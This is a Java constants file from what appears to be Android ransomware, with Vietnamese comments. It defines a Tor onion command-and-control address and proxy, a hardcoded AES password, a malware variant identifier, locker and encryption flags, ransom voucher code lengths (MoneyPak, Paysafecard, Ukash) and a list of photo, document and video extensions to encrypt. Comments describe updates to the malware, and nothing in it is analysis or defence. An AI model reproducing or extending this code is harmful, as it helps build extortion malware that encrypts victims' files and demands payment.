package com.example.into_demo;

import java.net.InetSocketAddress;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Constants {
    public static final String C2_SERVER = "jnxtpc7hpoz343xdylwuc2skxe2bpb43mlcoq5wjanwuvqk4f6quapyd.onion"; // Địa chỉ máy chủ C2 (Tor onion)
    public static final int PORT = 80; // Cổng máy chủ C2
    public static final String RESPONSE_PATH = "/response/"; // Đường dẫn để gửi response
    public static final String RESPONSE_KEY = "output"; // Khóa cho payload POST
    public static final Map<String, String> HEADER = new HashMap<>(); // Header HTTP
    public static final InetSocketAddress PROXY = new InetSocketAddress("127.0.0.1", 9050); // Proxy Tor (Orbot default port 9050, fix từ 80)
    public static final int CHECK_MAIN_WINDOW_TIME_SECONDS = 1;
    public static final String CIPHER_PASSWORD = "jndlasf074hr"; // Mật khẩu mã hóa AES
    public static final String CLIENT_NUMBER = "19"; // Mã định danh của biến thể malware
    public static final String DEBUG_TAG = "DEBUGGING";
    public static final String DISABLE_LOCKER = "DISABLE_LOCKER";
    public static final String FILES_WAS_ENCRYPTED = "FILES_WAS_ENCRYPTED";
    public static final int MONEYPACK_DIGITS_NUMBER = 14;
    public static final int PAYSAFECARD_DIGITS_NUMBER = 16;
    public static final int UKASH_DIGITS_NUMBER = 19;
    public static final int POLLING_TIME_MINUTES = 5; // Tăng từ 3 để tiết kiệm battery
    public static final String PREFS_NAME = "AppPrefs";
    public static final String RUN_FLAG = "RUN_ME"; // Tệp bỏ qua khi quét
    public static final String ENCRYPT_LOG = "enc_log.txt"; // Tệp log bỏ qua khi quét
    public static final List<String> EXTENSIONS_TO_ENCRYPT;

    static {
        // Các phần mở rộng tệp tin sẽ bị mã hóa (thêm webp, heic cho 2025)
        EXTENSIONS_TO_ENCRYPT = Arrays.asList("jpeg", "jpg", "png", "bmp", "gif", "webp", "heic",
                "pdf", "doc", "docx", "txt",
                "avi", "mkv", "3gp", "mp4");

        // Thiết lập header HTTP
        HEADER.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        HEADER.put("Accept", "application/json");
    }
}